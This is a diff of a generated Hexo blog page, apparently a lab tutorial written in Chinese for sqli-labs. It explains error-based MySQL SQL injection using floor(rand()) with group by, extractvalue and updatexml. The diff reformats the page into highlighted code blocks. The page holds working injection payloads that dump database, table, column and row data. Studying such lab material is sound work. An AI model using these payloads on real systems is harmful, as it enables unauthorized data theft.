@@ -25,7 +25,8 @@
   
 <script src="/js/pace.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
 
 <body>
   <main class="content">
@@ -131,27 +132,51 @@
 <p><code>对任意正或者负的十进制值向下取整</code></p>
 <p><code>通常利用这两个函数的方法是floor(rand(0))*2 ,其会生成0和1两个数</code></p>
 <p>通用公式</p>
-<p><code>select count(*),concat((要查询的语句),floor(rand(0)*2)) as a from information_schema.tables  group by a</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`select count(*),concat((要查询的语句),floor(rand(0)*2)) as a from information_schema.tables  group by a`</span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h2><p>函数原型：extractvalue(xml_document,Xpath_string)<br>正常语法：extractvalue(xml_document,Xpath_string);<br>第一个参数：xml_document是string格式，为xml文档对象的名称<br>第二个参数：Xpath_string是xpath格式的字符串<br>作用：从目标xml中返回包含所查询值的字符串</p>
 <p>第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。</p>
-<p>pyload：id=’and(select extractvalue(“anything”,concat(‘~’,(select语句))))</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyload：id=&#x27;and(select extractvalue(&quot;anything&quot;,concat(&#x27;~&#x27;,(select语句))))</span><br></pre></td></tr></table></figure>
+
 <p>例如：</p>
-<p><code>id=&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select database()))))</code><br><code>id=&#39;and(select extractvalue(1,concat(0x7e,@@version)))</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`id=&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select database()))))`</span><br><span class="line">`id=&#x27;and(select extractvalue(1,concat(0x7e,@@version)))`</span><br></pre></td></tr></table></figure>
+
 <p>针对mysql数据库：</p>
-<p><code>查数据库名：id=&#39;and(select extractvalue(1,concat(0x7e,(select database()))))</code><br><code>爆表名：id=&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))</code><br><code>爆字段名：id=&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))</code><br><code>爆数据：id=&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`查数据库名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))`</span><br><span class="line">`爆表名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))`</span><br><span class="line">`爆字段名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))`</span><br><span class="line">`爆数据：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))`</span><br></pre></td></tr></table></figure>
+
 <p>注：</p>
-<p> ① 0x7e=’<del>’<br> ② concat(‘a’,‘b’)=“ab”<br> ③ version()=@@version<br> ④ ‘</del>‘可以换成’#’、’$’等不满足xpath格式的字符<br> ⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">① 0x7e=’~’</span><br><span class="line"> ② concat(‘a’,‘b’)=“ab”</span><br><span class="line"> ③ version()=@@version</span><br><span class="line"> ④ ‘~‘可以换成’#’、’$&#x27;等不满足xpath格式的字符</span><br><span class="line"> ⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</span><br></pre></td></tr></table></figure>
+
+
+
+
 <h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h2><p><code>函数原型：updatexml(xml_document,xpath_string,new_value)</code><br><code>正常语法：updatexml(xml_document,xpath_string,new_value)</code><br><code>第一个参数：xml_document是string格式，为xml文档对象的名称 第二个参数：xpath_string是xpath格式的字符串</code><br>`第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值``</p>
 <p>第二个参数跟extractvalue函数的第二个参数一样，因此也可以利用，且利用方式相同<br>payload：id=’and(select updatexml(“anything”,concat(‘~’,(select语句())),”anything”))</p>
 <p>例如：</p>
-<p><code>&#39;and(select updatexml(1,concat(&#39;~&#39;,(select database())),1))</code><br><code>&#39;and(select updatexml(1,concat(0x7e,@@database),1))</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`&#x27;and(select updatexml(1,concat(&#x27;~&#x27;,(select database())),1))`</span><br><span class="line">`&#x27;and(select updatexml(1,concat(0x7e,@@database),1))`</span><br></pre></td></tr></table></figure>
+
 <p>同样，针对mysql：</p>
-<p><code>爆数据库名：&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</code><br><code>爆表名：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))</code><br><code>爆列名：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))</code><br><code>爆数据：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`爆数据库名：&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))`</span><br><span class="line">`爆表名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))`</span><br><span class="line">`爆列名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))`</span><br><span class="line">`爆数据：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))`</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/16/%E2%80%9Csql-labs%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E2%80%9D/" data-id="ckuy6khfn000bistcgid44fdz" class="article-share-link">
+      <a data-url="http://example.com/2021/10/16/%E2%80%9Csql-labs%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E2%80%9D/" data-id="ckuzfar9i000aqwtc8yzqggzx" class="article-share-link">
         Share
       </a>
       
@@ -212,7 +237,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/12/sqlilab1-4/" data-id="ckuy6khfh0001istcdsjq0nql" class="article-share-link">
+      <a data-url="http://example.com/2021/10/12/sqlilab1-4/" data-id="ckuzfar9c0002qwtc6ev3avbx" class="article-share-link">
         Share
       </a>
       
@@ -266,7 +291,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/11/mysql%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" data-id="ckuy6khfc0000istc1ayo4c7n" class="article-share-link">
+      <a data-url="http://example.com/2021/10/11/mysql%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" data-id="ckuzfar960000qwtchoxj6cq1" class="article-share-link">
         Share
       </a>
       
@@ -553,7 +578,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/07/php%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" data-id="ckuy6khfn000aistc9ib55wkp" class="article-share-link">
+      <a data-url="http://example.com/2021/10/07/php%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" data-id="ckuzfar9a0001qwtcdnlohbi4" class="article-share-link">
         Share
       </a>
       
@@ -617,7 +642,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/09/26/php%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/" data-id="ckuy6khfk0004istceo1ge75m" class="article-share-link">
+      <a data-url="http://example.com/2021/09/26/php%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/" data-id="ckuzfar9e0004qwtchecw3xsp" class="article-share-link">
         Share
       </a>
       
@@ -683,7 +708,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/09/22/web%E5%AE%89%E5%85%A8-%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" data-id="ckuy6khfi0002istc65wi88jw" class="article-share-link">
+      <a data-url="http://example.com/2021/09/22/web%E5%AE%89%E5%85%A8-%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" data-id="ckuzfar9j000bqwtcdqu3ac2v" class="article-share-link">
         Share
       </a>
       
